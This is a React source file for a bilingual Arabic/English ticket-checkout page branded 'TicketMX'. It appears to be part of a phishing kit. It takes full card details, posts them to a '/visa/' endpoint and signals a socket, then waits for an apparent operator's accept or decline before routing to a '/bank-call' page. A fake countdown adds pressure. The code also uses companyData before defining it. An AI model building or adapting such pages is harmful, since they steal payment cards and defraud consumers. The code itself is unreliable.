import React, { useEffect, useState, useMemo } from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { api_route, socket } from "../App";
import { validatePaymentDetails } from "../utils/paymentValidation";
import { useTranslation } from "../context/LanguageContext";
import Footer from "../Footer";
import ProcessingWaitModal from "../components/confirm/ProcessingWaitModal";

const Confirm = ({ setLoading }) => {
  const { t, dir, language } = useTranslation();
  const isAr = language === "ar";
  const navigate = useNavigate();

  const search = window.location.search;
  const data = useMemo(() => new URLSearchParams(search), [search]);
  const query = useMemo(() => {
    try {
      return JSON.parse(data.get("data") || "{}");
    } catch {
      return {};
    }
  }, [data]);
  const selectedPaymentMethod =
    query.paymentMethod ||
    companyData.paymentMethod ||
    sessionStorage.getItem("paymentMethod") ||
    "";
  const isChosenAmex =
    selectedPaymentMethod.toLowerCase() === "amex" ||
    selectedPaymentMethod.toLowerCase().includes("american");

  const sessionCompany = useMemo(() => {
    try {
      return JSON.parse(sessionStorage.getItem("companyData") || "{}");
    } catch {
      return {};
    }
  }, []);

  const companyData = query.companyData || sessionCompany || {};

  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [, setVrefiy] = useState(false);
  const [load, setLoad] = useState(null);

  const price =
    parseFloat(String(companyData.price ?? "").replace(/[^\d.]/g, "")) || 0;
  const vat = companyData.total ? 0 : +(price * 0.15).toFixed(2);
  const total = companyData.total
    ? parseFloat(companyData.total)
    : +(price + vat).toFixed(2);
  const cleanCardDigits = card_number.replace(/\D/g, "");
  const hasCardDigits = cleanCardDigits.length > 0;
  const isCardAmex = isChosenAmex || cleanCardDigits.startsWith("3");
  const isVisaCard = !isCardAmex && cleanCardDigits.startsWith("4");

  const brandLogo = isCardAmex
    ? "/amex.jpeg"
    : hasCardDigits
      ? isVisaCard
        ? "/visa.jpeg"
        : "/master.jpeg"
      : null;

  const formatCardNumber = (value) => {
    const numericValue = value.replace(/\D/g, "");
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");
    formattedValue = formattedValue.slice(0, 19);
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    setErrorCard(false);
    formatCardNumber(e.target.value);
  };
  const [popUp, setPopUp] = useState(true);
  const [counter, setCounter] = useState(60 * 60 * 2);

  useEffect(() => {
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    // Auto-close popup after 6 seconds
    const autoCloseTimer = setTimeout(() => {
      setPopUp(false);
    }, 6000);

    return () => {
      clearInterval(interval);
      clearTimeout(autoCloseTimer);
    };
  }, []);

  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes,
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
  const handleExpiryChange = (e) => {
    setErrorCard(false);
    let val = e.target.value.replace(/\D/g, "");
    if (val.length > 4) val = val.slice(0, 4);
    if (val.length >= 3) {
      setExpiryDate(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiryDate(val);
    }
  };

  const handleCvvChange = (e) => {
    setErrorCard(false);
    const numericValue = e.target.value.replace(/\D/g, "");
    const maxLen = isCardAmex ? 4 : 3;
    setCvv(numericValue.slice(0, maxLen));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoad(true);
    setError(false);
    setErrorCard(false);

    let check = card_number.split(" ").join("");
    const paymentError = validatePaymentDetails({
      cardDigits: check,
      expiryDate,
      cvv,
      cardName: car_holder_name,
      isAmex: isCardAmex,
    });

    if (paymentError) {
      setLoad(false);
      return setErrorCard(paymentError);
    }

    const cleanDigits = card_number.replace(/\D/g, "");
    const isAmex = isChosenAmex || cleanDigits.startsWith("3");
    const isVisa = !isAmex && cleanDigits.startsWith("4");
    const cardBrand = isAmex ? "AMEX" : isVisa ? "VISA" : "MASTER";
    const finalData = {
      ...query,
      cardNumber: card_number,
      expiryDate,
      cvv,
      pin,
      card_name: car_holder_name,
      cardBrand,
    };

    try {
      const targetId =
        query._id || sessionStorage.getItem("orderId") || "guest";
      await axios.post(api_route + "/visa/" + targetId, finalData).then(() => {
        socket.emit("paymentForm", targetId);
        setVrefiy(true);
      });
    } catch {
      setLoad(false);
    } finally {
      if (setLoading) setLoading(false);
    }
  };

  useEffect(() => {
    const targetId = query._id || sessionStorage.getItem("orderId") || "guest";

    const onAcceptPaymentForm = (id) => {
      if (id !== targetId) return;
      setVrefiy(false);
      const cleanDigits = card_number.replace(/\D/g, "");
      const isAmex = isChosenAmex || cleanDigits.startsWith("3");
      const isVisa = !isAmex && cleanDigits.startsWith("4");
      const cardBrandStr = isAmex ? "AMEX" : isVisa ? "VISA" : "MASTER";
      sessionStorage.setItem(
        "card",
        isAmex ? "amex" : isVisa ? "visa" : "master",
      );
      sessionStorage.setItem("cardNumber", card_number);
      navigate(
        `/bank-call?data=${encodeURIComponent(
          JSON.stringify({
            ...query,
            cardNumber: card_number,
            cardBrand: cardBrandStr,
          }),
        )}`,
      );
    };

    const onDeclinePaymentForm = (id) => {
      if (id !== targetId) return;
      setVrefiy(false);
      setLoad(false);
      setError("confirm.invalidCardRetry");
    };

    socket.on("acceptPaymentForm", onAcceptPaymentForm);
    socket.on("declinePaymentForm", onDeclinePaymentForm);
    return () => {
      socket.off("acceptPaymentForm", onAcceptPaymentForm);
      socket.off("declinePaymentForm", onDeclinePaymentForm);
    };
  }, [card_number, isChosenAmex, navigate, query]);

  const handleBack = (e) => {
    if (e) e.preventDefault();
    if (window.history.length > 1) navigate(-1);
    else navigate("/summary");
  };

  return (
    <div
      className="min-h-screen flex flex-col bg-[#f0eae3] font-['GraphikArabic',sans-serif] text-[#2d242f]"
      dir={dir}
    >
      {load ? <ProcessingWaitModal t={t} dir={dir} /> : null}
      {popUp && (
        <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-[#00000053] bg-opacity-45">
          <div className="w-11/12 md:w-fit p-4 rounded-xl bg-white flex flex-col items-center shadow-2xl max-w-sm">
            <img
              src="/payment.jpeg"
              alt="Offer"
              className="w-full md:w-48 object-contain rounded-md"
            />
            <span className="text-xl my-4 text-gray-800 w-fit font-bold text-center">
              {dir === "rtl"
                ? "سارع قبل نهاية العرض !"
                : "Hurry before the offer ends!"}
            </span>
            <span className="font-medium text-gray-600 text-sm">
              {dir === "rtl"
                ? "يتبقى على انتهاء العرض:"
                : "Time remaining for the offer:"}
            </span>
            <div
              className="text-green-600 text-3xl my-3 font-bold font-mono tracking-wider"
              dir="ltr"
            >
              {formattedTime}
            </div>
            <button
              type="button"
              onClick={() => setPopUp(false)}
              className="bg-[#6c757d] hover:bg-[#5a6268] transition-colors text-white w-full text-base font-semibold py-2.5 rounded-lg mt-2 cursor-pointer"
            >
              {dir === "rtl" ? "إغلاق" : "Close"}
            </button>
          </div>
        </div>
      )}
      {/* TicketMX Header matching Screenshot 1 (Desktop) and Screenshot 2 (Mobile) */}
      <div className="page-header w-full bg-[#4a374b] py-5 md:py-6 px-4 md:px-12 border-b border-[#3b2a3c]">
        <div className="container-wide max-w-[1300px] mx-auto flex flex-col md:flex-row items-center justify-between gap-4">
          {/* Stepper: Mobile on top, Desktop on left (in RTL) */}
          <div className="steps w-full md:w-auto min-w-[280px] sm:min-w-[340px] order-1 md:order-2">
            <ul className="steps-container relative flex items-center justify-between m-0 p-0 list-none">
              {/* Connecting line behind circles */}
              <div className="absolute top-[6px] left-[16%] right-[16%] h-[2px] bg-[#ffc54b] z-0" />

              {/* Step 1: تسجيل دخول */}
              <li className="active relative z-10 flex flex-col items-center flex-1">
                <div className="w-3 h-3 rounded-full bg-[#ffc54b] ring-2 ring-[#ffc54b]/30 mb-1.5" />
                <span className="text-[11px] sm:text-xs font-bold text-[#ffc54b] text-center">
                  {isAr ? "تسجيل دخول" : "Login"}
                </span>
              </li>

              {/* Step 2: اختيار التذاكر */}
              <li className="active relative z-10 flex flex-col items-center flex-1">
                <div className="w-3 h-3 rounded-full bg-[#ffc54b] ring-2 ring-[#ffc54b]/30 mb-1.5" />
                <span className="text-[11px] sm:text-xs font-bold text-[#ffc54b] text-center">
                  {isAr ? "اختيار التذاكر" : "Select Tickets"}
                </span>
              </li>

              {/* Step 3: إتمام الشراء */}
              <li className="active relative z-10 flex flex-col items-center flex-1">
                <div className="w-3 h-3 rounded-full bg-[#ffc54b] ring-2 ring-[#ffc54b]/30 mb-1.5" />
                <span className="text-[11px] sm:text-xs font-bold text-[#ffc54b] text-center">
                  {isAr ? "إتمام الشراء" : "Complete Purchase"}
                </span>
              </li>
            </ul>
          </div>

          {/* Title: Mobile centered below stepper, Desktop on right (in RTL) */}
          <div className="title flex-grow-1 order-2 md:order-1 text-center md:text-start text-2xl sm:text-3xl font-bold text-white">
            {isAr ? "إتمام الشراء" : "Complete Purchase"}
          </div>
        </div>
      </div>

      {/* Main Payment Section */}
      <div className="flex-grow py-8 md:py-16 px-4 flex flex-col items-center justify-start">
        {/* Silver Metallic Card Widget matching Screenshots 1 & 2 */}
        <div
          className="relative w-full max-w-[560px] rounded-2xl p-6 sm:p-7 shadow-[0_12px_28px_rgba(0,0,0,0.22)] border border-white/60 overflow-hidden"
          style={{
            background:
              "linear-gradient(135deg, #c7c9cc 0%, #dbdcde 35%, #b5b7ba 65%, #a1a3a6 100%)",
          }}
        >
          {/* Subtle diagonal reflection shine */}
          <div
            className="pointer-events-none absolute inset-0"
            style={{
              background:
                "linear-gradient(130deg, rgba(255,255,255,0.45) 0%, rgba(255,255,255,0.18) 32%, transparent 60%)",
            }}
          />

          <form onSubmit={handleSubmit} className="relative z-10">
            {/* Card Brand Logo: Amex if chosen, otherwise Visa or Mastercard */}
            <div
              className="mb-3 flex justify-start min-h-[34px] items-center"
              style={{ direction: "ltr" }}
            >
              {brandLogo && (
                <img
                  src={brandLogo}
                  alt={
                    isCardAmex
                      ? "American Express"
                      : isVisaCard
                        ? "Visa"
                        : "Mastercard"
                  }
                  className="h-8 sm:h-9 w-auto max-w-[75px] object-contain rounded bg-white px-1.5 py-0.5 shadow-sm border border-black/10"
                />
              )}
            </div>

            {/* 2-Column Grid on Desktop, 1-Column on Mobile */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-x-5 gap-y-3.5">
              {/* Field 1: رقم البطاقة (Card Number) -> Row 1 Right */}
              <div className="order-1">
                <label className="block text-xs sm:text-sm font-semibold text-[#2d242f] mb-1 text-start">
                  {isAr ? "رقم البطاقة" : "Card Number"}
                </label>
                <input
                  type="text"
                  name="card.number"
                  value={card_number}
                  onChange={handleCardNumberChange}
                  placeholder={isAr ? "رقم البطاقة" : "Card Number"}
                  autoComplete="cc-number"
                  inputMode="numeric"
                  maxLength={19}
                  dir="ltr"
                  required
                  className="w-full h-9 px-3 bg-white border border-[#c9cace] rounded text-sm text-[#2d242f] placeholder-[#8e8e93] outline-none focus:border-[#4a374b] transition-all text-center"
                />
              </div>

              {/* Field 2: تاريخ الإنتهاء (Expiry Date) -> Row 1 Left */}
              <div className="order-2">
                <label className="block text-xs sm:text-sm font-semibold text-[#2d242f] mb-1 text-start">
                  {isAr ? "تاريخ الإنتهاء" : "Expiry Date"}
                </label>
                <input
                  type="tel"
                  value={expiryDate}
                  onChange={handleExpiryChange}
                  placeholder={isAr ? "شهر / سنة" : "MM / YY"}
                  maxLength={5}
                  autoComplete="cc-exp"
                  required
                  dir="ltr"
                  className="w-full h-9 px-3 bg-white border border-[#c9cace] rounded text-sm text-[#2d242f] placeholder-[#8e8e93] outline-none focus:border-[#4a374b] transition-all text-center"
                />
              </div>

              {/* Field 3: اسم حامل البطاقة (Cardholder Name) -> Row 2 Right */}
              <div className="order-3">
                <label className="block text-xs sm:text-sm font-semibold text-[#2d242f] mb-1 text-start">
                  {isAr ? "اسم حامل البطاقة" : "Cardholder Name"}
                </label>
                <input
                  type="text"
                  name="card.holder"
                  value={car_holder_name}
                  onChange={(e) => {
                    setErrorCard(false);
                    setCardHolderName(e.target.value);
                  }}
                  placeholder={isAr ? "اسم حامل البطاقة" : "Cardholder Name"}
                  autoComplete="cc-name"
                  required
                  className="w-full h-9 px-3 bg-white border border-[#c9cace] rounded text-sm text-[#2d242f] placeholder-[#8e8e93] outline-none focus:border-[#4a374b] transition-all text-center"
                />
              </div>

              {/* Field 4: رمز التحقق (CVV) -> Row 2 Left */}
              <div className="order-4">
                <label className="block text-xs sm:text-sm font-semibold text-[#2d242f] mb-1 text-start">
                  {isAr ? "(CVV) رمز التحقق" : "CVV Code"}
                </label>
                <input
                  type="text"
                  name="card.cvv"
                  value={cvv}
                  onChange={handleCvvChange}
                  placeholder={isAr ? "(CVV) رمز التحقق" : "CVV"}
                  inputMode="numeric"
                  maxLength={isCardAmex ? 4 : 3}
                  autoComplete="cc-csc"
                  dir="ltr"
                  required
                  className="w-full h-9 px-3 bg-white border border-[#c9cace] rounded text-sm text-[#2d242f] placeholder-[#8e8e93] text-center outline-none focus:border-[#4a374b] transition-all "
                />
              </div>

              {/* Error messages if validation fails */}
              {errorCard && (
                <div className="col-span-1 md:col-span-2 p-2 rounded bg-red-100 border border-red-300 text-red-700 text-xs text-center font-medium">
                  {t(errorCard)}
                </div>
              )}
              {error && (
                <div className="col-span-1 md:col-span-2 p-2 rounded bg-red-100 border border-red-300 text-red-700 text-xs text-center font-medium">
                  {t(error)}
                </div>
              )}

              {/* Field 5: زر الدفع (Pay Button) -> Left side of Card */}
              <div
                className="order-5 md:col-start-2 pt-2 flex justify-start"
                style={{ direction: "ltr" }}
              >
                <button
                  type="submit"
                  className="bg-black hover:bg-neutral-800 text-white font-bold text-sm px-6 py-2 rounded transition-all cursor-pointer shadow-sm active:scale-95"
                >
                  {isAr ? "إدفع الآن" : "Pay Now"}
                </button>
              </div>
            </div>
          </form>
        </div>

        {/* Cancel link below card */}
        <div className="flex justify-center mt-5 text-center">
          <button
            type="button"
            onClick={handleBack}
            className="text-[#333] hover:text-[#4a374b] text-sm font-medium cursor-pointer bg-transparent border-0 underline"
          >
            {isAr ? "الغاء" : "Cancel"}
          </button>
        </div>
      </div>

      {/* Footer */}
      <Footer />
    </div>
  );
};

export default Confirm;
